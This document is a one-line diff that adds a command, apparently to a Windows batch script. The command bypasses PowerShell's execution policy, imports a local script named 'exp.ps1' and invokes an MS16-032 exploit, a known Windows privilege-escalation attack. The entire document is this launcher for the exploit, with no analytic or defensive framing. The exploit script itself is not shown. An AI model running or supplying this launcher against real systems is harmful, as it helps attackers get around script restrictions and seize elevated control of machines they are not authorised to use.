@@ -1,0 +1,1 @@
+powershell -exec bypass -command "import-module %~dp0\exp.ps1; invoke-ms16-032"
